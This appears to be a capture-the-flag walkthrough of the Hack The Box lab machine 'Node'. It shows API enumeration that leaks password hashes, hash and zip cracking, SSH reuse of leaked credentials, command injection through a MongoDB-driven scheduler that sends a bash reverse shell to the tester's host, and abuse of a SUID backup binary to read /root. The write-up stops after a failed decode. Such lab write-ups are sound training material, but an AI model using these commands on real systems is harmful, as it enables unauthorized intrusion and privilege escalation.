# Hack The Box - Node Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.58    
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-09 11:31 EST
Nmap scan report for 10.10.10.58
Host is up (0.22s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.03 seconds
```

Before starting enumeration, I ran a more comprehensive `nmap` scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports. The idea behind using `Rustscan` is that it is faster compared to Nmap since `Rustscan` using Multi-threading but doesnt have service, OS, script scan features. So, I basically used `Rustscan` to find open ports and If I find them, i'll only scan those ports for services, version & OS detection using Nmap, making it faster and much efficient.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ rustscan -a 10.10.10.58 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.58:22
Open 10.10.10.58:3000
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,3000 10.10.10.58

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-09 11:34 EST
Initiating Ping Scan at 11:34
Scanning 10.10.10.58 [2 ports]
Completed Ping Scan at 11:34, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.10.58 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds
```

So, Rustscan & nmap both found `2` open ports and the results are: 

- Port `22`: running `OpenSSH 7.2p2`.
- Port `3000`: running `Apache Hadoop`.

## Enumeration

I visited the web-page on port `3000`.

![node-1](https://user-images.githubusercontent.com/87711310/217880702-1e9a84ab-63f2-4b28-83c6-39ec0a489f6a.png)

There was a login page, and I tried common credentials to see if I could log into the page but it wasn't useful

![node-2](https://user-images.githubusercontent.com/87711310/217880877-caef362a-9fc1-49b4-82f9-2133525e032d.png)

Then, I took a look at the source-code of the website to see if I could find something useful

Looking at the bottom section of the source-code, I found a few custom javascript files

```
	<script type="text/javascript" src="assets/js/app/app.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
	<script type="text/javascript" src="assets/js/misc/freelancer.min.js"></script>
```

So, I started looking at it one by one manually.

The `app.js` file wasn't useful

```javascript
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});

```

The `home.js` file had this `/api/uses/latest` route. 

```javasctipt
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

Visiting the `/api/users/latest` page, I found few usernames, passwords and some kind `is_admin` authentication which none of the users had.

![node-3](https://user-images.githubusercontent.com/87711310/217883651-93cab04e-0ff0-4b38-9772-7b6935ed2f2a.png)

So, I decided to move to `/login.js` page, which had another `/api/session/authenticate` page mentioned which just redirected me back to the home page.

```javascript
var controllers = angular.module('controllers');

controllers.controller('LoginCtrl', function ($scope, $http, $location) {
  $scope.authenticate = function () {
    $scope.hasError = false;

    $http.post('/api/session/authenticate', {
      username: $scope.username,
      password: $scope.password
    }).then(function (res) {
      if (res.data.success) {
        $location.path('/admin');
      }
      else {
        $scope.hasError = true;
        $scope.alertMessage = 'Incorrect credentials were specified';
      }
    }, function (resp) {
      $scope.hasError = true;
      $scope.alertMessage = 'An unexpected error occurred';
    });
  };
});
```

Then, I visited the `/admin.js` script, which had `/api/admin/backup` endpoint, which seemed juicy.

```javascript
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

Visiting the `/api/admin/backup` displayed me an `authenticated: false` error. This link is restricted but at least we know that the admin account has a backup file in it.

Finally, I visited the `/profile.js` script, which gave me another `/api/users` endpoint.

```javascript
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});

```

On visiting the `/api/users` endpoint, I, again, found few username, passwords and `is_admin` authentication check, but this time, there was one user which had `is_admin: true`

![node-4](https://user-images.githubusercontent.com/87711310/217885535-53db972b-4e99-424d-8b78-dca6d8280c20.png)

So, I copied that user's password, which was hashed and tried to crack it. I used [Crackstation](https://crackstation.net/) instead on using hydra or John The Ripper.

![node-5](https://user-images.githubusercontent.com/87711310/217886009-01c56deb-fe75-4870-b645-4d76f839d75c.png)

One thing to note here is none of the passwords are salted. This can be verified using the following command.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ echo -n "manchester" | sha256sum
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af - 
```

This obviously considerably decreased the amount of time it would have taken the tool to crack all the passwords.

Now that I got a username:password, I logged through the login page.

![node-6](https://user-images.githubusercontent.com/87711310/217886486-7c6c30b6-fadd-41bb-bbdb-784d145e67ba.png)

Here, I found a backup folder, which I dowonloaded to check out its contents.

NOTE: A strange thing happened with me, I was not able to download the backup file. If it happens with you too, Don't Worry!! Just go to the `/api/admin/backup` endpoint, and you'll get a long sequence of ASCII characters and that's exactly what is in the file you'd download in the `Download Backup`.


Now, on inspecting it, they seemed like they were `Base64` encoded. So, I decided to decode it

```
cat myplace.backup | base64 --decode > myplace-decoded.backup
```

Now, on viewing the file type, I found that it was zip file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ file myplace-decoded.backup 
myplace-decoded.backup: Zip archive data, at least v1.0 to extract, compression method=store
```

So, I tried to decompress it.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ unzip myplace-decoded.backup
[myplace-decoded.backup] var/www/myplace/package-lock.json password:
```

It was password-protected. I ran `fcrackzip` which is a password cracker for zip files.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
...[snip]...
PASSWORD FOUND!!!!: pw == magicword
```

Once, I found the password, i unzipped the file using the cracked password. Looking at the contents I found another username and password.

```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

I found a username `mark` and a password `5AYRft73VtFpc84k` to connect to mongodb locally. We also see a `backup_key` which we’re not sure where it’s used, but we’ll make note of it.

## Inital Foothold.
I tried using these credentials to log into ssh to see if it worked and it actually did!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ ssh mark@10.10.10.58                  
The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Feb 17 06:52:30 2023 from 10.10.14.14
mark@node:~$ whoami
mark

```

Grabbing the user flag.

```
mark@node:~$ pwd
/home/mark
mark@node:~$ ls
mark@node:~$ cd ..
mark@node:/home$ ls
frank  mark  tom
mark@node:/home$ cd tom
mark@node:/home/tom$ ls
user.txt
mark@node:/home/tom$ cat user.txt
cat: user.txt: Permission denied
```

Now, I was denied the permission to view the flag and it was obvious that I had to either escalate my privileges to tom or root in order to view the flag.

So, I decided to transfer `Linpeas` from my machine to the target machine.

I started up a python server in the same directory that the script resides, using the following command:

```
python -m http.server 8081
```

Inside the target machine, I moved to `/tmp` directory where I had write privileges and downloaded the Linpeas script

```
mark@node:/home/tom$ cd /tmp 
mark@node:/tmp$ wget http://10.10.14.53:8081/linpeas.sh
--2023-02-17 16:28:29--  http://10.10.14.53:8081/linpeas.sh
Connecting to 10.10.14.53:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828078 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                      100%[====================================================================================================================================================>] 808.67K   449KB/s    in 1.8s    

2023-02-17 16:28:32 (449 KB/s) - 'linpeas.sh' saved [828078/828078]
```

Gave it execute privileges.
```
mark@node:/tmp$ chmod +x linpeas.sh
```

And ran the script.

The networking (active ports) indicated that the port `27017` was listening locally  and googling about the services running on the port, I found out that it was `MongoDB` that was running on the port `27017`

```
.....
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
.....### SERVICES #############################################
[-] Running processes:USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
.....
tom       1196  0.0  7.3 1028640 56072 ?       Ssl  03:44   0:06 /usr/bin/node /var/www/myplace/app.js
mongodb   1198  0.5 11.6 281956 87956 ?        Ssl  03:44   2:43 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1199  0.0  5.9 1074616 45264 ?       Ssl  03:44   0:07 /usr/bin/node /var/scheduler/app.js
....
```

While looking at the processes running on the machine, I found out two processes runnins tom

```
mark@node:/home$ ps auxww
...[snip]...
tom       1249  0.1  8.2 1064924 62392 ?       Ssl  Feb16   2:47 /usr/bin/node /var/www/myplace/app.js
tom       1250  0.0  4.2 1075128 31860 ?       Ssl  Feb16   0:21 /usr/bin/node /var/scheduler/app.js
...[snip]...
```

Since I was trying to escalate my privileges to Toms’, I decided to investigate this file.

```
mark@node:/tmp$ ls -la /var/scheduler
total 28
drwxr-xr-x  3 root root 4096 Aug 16  2022 .
drwxr-xr-x 15 root root 4096 Aug 16  2022 ..
-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
drwxr-xr-x 19 root root 4096 Aug 16  2022 node_modules
-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
```


I only had the permissions to read the file, so I couldnt simply include a reverse shell in there. So, I decided to look at the contents of the file.

```
mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

This script will connect to the Mongo database, and then run a series of commands every 30 seconds. It will get items out of the `tasks` collection. For each doc, it will pass `doc.cmd` to `exec` to run it, and then delete the doc.

The file also had credentials to connect to the DB using the Mongo client specifying the user, password, and database to connect to:

```
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
```

In Mongo, a database (like `scheduler`) has collections (kind of like tables in SQL). The db had one collection

```
> show collections
tasks
```

The collection had no objects in it.
```
> db.tasks.find()
> 
```

Since, there was nothing in the collection, I decided to try and add a simple command to `touch` a file in `/tmp`:

```
> db.tasks.insert({"cmd": "touch /tmp/fak3r"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("63f063be51ea017431088678"), "cmd" : "touch /tmp/fak3r" }
```


But now, as we read in the code that the files will be deleted in 30 secs, I waited to check if its true.

```
> db.tasks.find()
> 
```

It was true, and when I went back to the `/tmp`, a new file was created which was owned by `tom`.

```
mark@node:/tmp$ ls -l fak3r 
-rw-r--r-- 1 tom tom 0 Feb 18 05:36 fak3r
```

Now, that I could run commands and create files using the MongoDB as the user `tom`, I decided to insert a reverse shell into the DB as the command.

```
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("63f06b8bd95ca7076731c89d"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1'" }
```


And after a few moments, I got back a connection through my `netcat` listener.


```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.58] 57944
bash: cannot set terminal process group (1250): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ whoami
whoami
tom
```

I tried to upgrade the shell but I couldn't:

```
tom@node:/$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

So, I decided to grab the user flag.

```
tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ cat user.txt
cat user.txt
[REDACTED]
```

## Privilege Escalation

I decided to start with printing ot the user and group IDs of the user.

```
tom@node:/$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

The first thing that pop out was `sudo`, but trying to run `sudo` prompts for tom’s password, which I don’t have:

```
tom@node:~$ sudo su -
[sudo] password for tom:
```

Looking at other groups, `adm` means that I can access all the logs, and that’s worth checking out, but admin is more interesting. It’s group id (gid) is above 1000, which means it’s a group created by an admin instead of by the OS, which means it’s custom. Looking for files with this group, there’s only one:

```
tom@node:/$ find / -group admin -ls 2>/dev/null
find / -group admin -ls 2>/dev/null
    56747     20 -rwsr-xr--   1 root     admin       16484 Sep  3  2017 /usr/local/bin/backup
```

It was also a SUID binary owned my root, which means that it runs as root.

Interestingly, if you remember, the same file was called from the `/var/www/myplace/app.js` file.

```javascript
  app.get('/api/admin/backup', function (req, res) {                                                     
    if (req.session.user && req.session.user.is_admin) {                                                 
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);                         
      var backup = '';                                                                                   
                                                    
      proc.on("exit", function(exitCode) {                                                               
        res.header("Content-Type", "text/plain");                                                        
        res.header("Content-Disposition", "attachment; filename=myplace.backup");                        
        res.send(backup);                                                                                
      });                                                                                                
                                                                                                         
      proc.stdout.on("data", function(chunk) {                                                           
        backup += chunk;                            
      });        
                                                    
      proc.stdout.on("end", function() {          
      });
    }                                               
    else {                                   
      res.send({                                                                                         
        authenticated: false                        
      });                              
    }                          
  }); 
```

If you see the line where a variable `proc` is being defined,  you can see that `/usr/local/bin/backup` takes in 3 arguments:
- the string `-q`
- the backup key
- A directory path

Combining all 3 arguments, we get this:

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
```

We get a long, non-terminating ASCII text which is even difficult to scroll through, so I decided to output its result into a file, and it looked like it was Base64 encoded, so I decided to decode it and store its results into another folder.


```
tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp > test
<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp > test           
zip warning: No such device or address
tom@node:/tmp$ file test
file test
test: ASCII text, with very long lines, with no line terminators
tom@node:/tmp$ cat test | base64 --decode > test-decoded
cat test | base64 --decode > test-decoded
tom@node:/tmp$ file test-decoded 
file test-decoded 
test-decoded: Zip archive data, at least v1.0 to extract
tom@node:/tmp$ 
```

So, now, I decided to unzip the file to take a look at its contents.

```
tom@node:/tmp$ unzip test-decoded
unzip test-decoded
Archive:  test-decoded
   creating: tmp/
   skipping: tmp/test                unable to get password
   skipping: tmp/test-decoded        unable to get password
   creating: tmp/.Test-unix/
   creating: tmp/tmux-1001/
   creating: tmp/.XIM-unix/
   creating: tmp/vmware-root/
   creating: tmp/systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1/
   creating: tmp/systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1/tmp/
   skipping: tmp/linpeas.sh          unable to get password
   creating: tmp/.X11-unix/
   creating: tmp/.ICE-unix/
   creating: tmp/.font-unix/
   skipping: tmp/fak3r               unable to get password
```

Now, that I was able to dump the contents of the `/tmp` directory using the command, i tried to see I was able to dump the contents of the `/root` directory

Trying to read `/root` directory through `/usr/local/bin/backup` file
```
tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root                 
 [+] Finished! Encoded backup is below:
                                                                                                                                                                                                                                                                                                                            
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                                        
tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                     
<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                                                                         
tom@node:/tmp$ ls                                                                                                                                                                                                                                                                                                           
ls                                                                                                                                                                                                                                                                                                                          
fak3r                                                                                                                                                                                                                                                                                                                       
linpeas.sh                                                                                                                                                                                                                                                                                                                  
mongodb-27017.sock                                                                                                                                                                                                                                                                                                          
root                                                                                                                                                                                                                                                                                                                        
systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1                                                                                                                                                                                                                                           
test                                                                                                                                                                                                                                                                                                                        
test-decoded                                                                                                                                                                                                                                                                                                                
tmp                                                                                                                                                                                                                                                                                                                         
tmux-1001                                                                                                                                                                                                                                                                                                                   
vmware-root                                                                                                                                                                                                                                                                                                                 
tom@node:/tmp$ cat root | base64 --decode                                                                                                                                                                                                                                                                                   
cat root | base64 --decode                                                                                                                                                                                                                                                                                                  
base64: invalid input                                                                                                                                                                                                                                                                                                       
tom@node:/tmp$ cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                    
cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                                   
base64: invalid input                                                                                                                                                                                                                                                                                                       
tom@node:/tmp$ cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                          
cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                                         
base64: invalid input 
tom@node:/tmp$ ls  
ls
fak3r
linpeas.sh
mongodb-27017.sock
root   
root-decodedsystemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1  
test
test-decoded  
tmp
tmux-1001
vmware-root                                                                   
tom@node:/tmp$ file root-decoded                                             
file root-decoded                                                             
root-decoded: empty  
```



backup key
```
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
```
